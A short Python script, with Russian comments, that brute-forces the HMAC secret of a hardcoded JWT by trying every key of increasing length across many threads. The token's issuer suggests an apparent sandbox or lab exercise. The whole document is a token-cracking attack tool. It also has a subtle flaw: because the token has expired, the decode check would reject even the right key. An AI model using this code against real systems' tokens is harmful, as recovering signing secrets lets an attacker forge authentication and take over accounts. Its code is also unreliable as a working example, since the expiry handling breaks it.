import jwt
from itertools import product
import string
from concurrent.futures import ThreadPoolExecutor

# Целевой токен
target_token = "eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIxMDQxMTkxNzQ0IiwiaWF0IjoxNzE1ODgyODI3LCJzdWIiOiIyMDI0MDUxNiAxODA3MDc4OTgiLCJpc3MiOiJTYW5kYm94LVNlY3VyaXR5LUJhc2ljIiwiZXhwIjoxNzE4NDc0ODI3fQ.L4GM2xsq46xXUi1wye7-Ie63hKKvgHwBa50KW9BdWO0"

# Алфавит для подбора
alphabet = string.ascii_letters + string.digits + "-_"

# Длина ключа
key_length = 1

# Функция для проверки ключа
def try_key(candidate_key):
    try:
        decoded = jwt.decode(target_token, candidate_key, algorithms=["HS256"])
        return candidate_key
    except jwt.InvalidTokenError:
        return None
    except Exception as e:
        print(f"Ошибка: {e}")
        return None

# Основной цикл подбора
while True:
    print(f"Пробуем ключи длиной {key_length}...")
    
    # Генерация всех возможных комбинаций
    candidates = ("".join(candidate) for candidate in product(alphabet, repeat=key_length))
    
    # Многопоточный перебор
    with ThreadPoolExecutor() as executor:
        for result in executor.map(try_key, candidates):
            if result:
                print(f"Найден ключ: {result}")
                exit(0)
    
    key_length += 1
